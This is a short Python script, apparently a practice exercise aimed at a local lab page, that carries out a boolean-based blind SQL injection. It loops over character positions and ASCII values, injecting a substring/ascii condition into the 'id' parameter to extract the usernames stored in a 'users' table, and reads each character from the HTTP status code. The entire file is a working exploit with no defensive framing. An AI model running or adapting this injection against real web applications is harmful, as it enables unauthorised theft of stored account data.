#!/usr/bin/env python3
# Author: Juan García aka liandd
import sys
import signal
from termcolor import colored
import requests
from pwn import *
import time
import string


def def_handler(sig, frame):
    print(colored("\n\n[!] Saliendo...\n", "red"))
    sys.exit(1)


# Capturar Ctrl_C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
URL = "http://127.0.0.1/sqli.php"
CHARACTERS = string.printable


def make_SQLI():
    p1 = log.progress("Brute Force")
    p1.status("Loading")
    time.sleep(2)

    p2 = log.progress("Extracted data")

    extracted_info = ""

    for name_char_pos in range(1, 33):
        stopper = 0
        for char in range(33, 127):
            sqli_url = URL + \
                "?id=9 or ascii(substring((select group_concat(username) from users), {}, 1)) = {}".format(
                    name_char_pos, char)

            p1.status(sqli_url)

            response = requests.get(sqli_url)

            stopper = stopper + 1

            if response.status_code == 200:
                extracted_info += chr(char)
                p2.status(extracted_info)
                stopper = 0
                break
        if stopper == 94:
            break


if __name__ == '__main__':
    make_SQLI()
